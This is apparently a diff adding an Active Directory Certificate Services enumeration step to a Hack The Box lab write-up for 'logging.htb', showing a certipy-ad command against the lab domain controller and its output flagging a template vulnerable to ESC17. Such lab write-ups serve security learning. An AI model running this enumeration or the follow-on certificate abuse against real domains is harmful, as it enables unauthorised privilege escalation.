@@ -672,5 +672,91 @@ And now using this ticket i can auth as this user
 # ADCS enumeration
 
 ```python
+faketime -f +7h certipy-ad find -u 'jaylee.clifton@logging.htb' -k -no-pass -dc-host dc01.logging.htb -dc-ip 10.129.245.130 -target-ip 10.129.245.130 -target dc01.logging.htb -stdout -enabled -vulnerable
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'logging-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'logging-DC01-CA'
+[*] Checking web enrollment for CA 'logging-DC01-CA' @ 'DC01.logging.htb'
+[!] Error checking web enrollment: [Errno 111] Connection refused
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : logging-DC01-CA
+    DNS Name                            : DC01.logging.htb
+    Certificate Subject                 : CN=logging-DC01-CA, DC=logging, DC=htb
+    Certificate Serial Number           : 1E4F7EC9F5F17EA34E246D856D6C0C83
+    Certificate Validity Start          : 2026-04-24 16:40:56+00:00
+    Certificate Validity End            : 2126-04-24 16:50:56+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : LOGGING.HTB\Administrators
+      Access Rights
+        ManageCa                        : LOGGING.HTB\Administrators
+                                          LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        ManageCertificates              : LOGGING.HTB\Administrators
+                                          LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Enroll                          : LOGGING.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UpdateSrv
+    Display Name                        : UpdateSrv
+    Certificate Authorities             : logging-DC01-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-04-17T00:41:06+00:00
+    Template Last Modified              : 2026-04-17T00:41:07+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : LOGGING.HTB\IT
+                                          LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : LOGGING.HTB\Administrator
+        Full Control Principals         : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Write Owner Principals          : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Write Dacl Principals           : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+        Write Property Enroll           : LOGGING.HTB\Domain Admins
+                                          LOGGING.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : LOGGING.HTB\IT
+    [!] Vulnerabilities
+      ESC17                             : Enrollee supplies subject and template allows server authentication.
+    [*] Remarks
+      ESC17                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
 ```
+
